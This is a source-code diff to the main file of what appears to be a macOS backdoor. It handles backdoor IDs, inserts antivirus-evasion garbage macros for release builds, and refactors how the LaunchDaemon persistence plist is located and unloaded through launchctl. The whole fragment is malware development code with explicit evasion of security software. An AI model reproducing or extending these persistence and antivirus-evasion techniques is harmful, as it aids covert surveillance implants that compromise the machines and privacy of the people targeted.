@@ -12,6 +12,7 @@
 #import "RCSMCore.h"
 #import "RCSMCommon.h"
 #import "mach_override.h"
+#import "RCSMGlobals.h"
 
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
@@ -19,6 +20,7 @@
 #import "NSMutableData+SHA1.h"
 
 #import "RCSMAVGarbage.h"
+
 
 extern void lionSendEventToPid(pid_t pid);
 
@@ -54,6 +56,10 @@ int main (int argc, const char *argv[])
   // FIXED- fixing string binary patched
   gBackdoorID[14] = gBackdoorID[15] = 0;
   gMode[5] = 0;
+  
+  // Bogus for compiling
+  char *pseudoW = gBackdoorPseduoSign;
+  pseudoW = NULL;
   
   // AV evasion: only on release build
   AV_GARBAGE_002
@@ -125,12 +131,7 @@ int main (int argc, const char *argv[])
       //
       // Remove the LaunchDaemon plist
       //
-      NSString *backdoorPlist = [NSString stringWithFormat: @"%@/%@",
-                                 [[[[[NSBundle mainBundle] bundlePath]
-                                    stringByDeletingLastPathComponent]
-                                   stringByDeletingLastPathComponent]
-                                  stringByDeletingLastPathComponent],
-                                 BACKDOOR_DAEMON_PLIST ];
+      NSString *backdoorPlist = createLaunchdPlistPath();
  
       // AV evasion: only on release build
       AV_GARBAGE_009
@@ -141,6 +142,7 @@ int main (int argc, const char *argv[])
                                  [[backdoorPlist lastPathComponent]
                                   stringByDeletingPathExtension],
                                  nil];
+      
       [gUtil executeTask: @"/bin/launchctl"
            withArguments: _commArguments
             waitUntilEnd: YES];
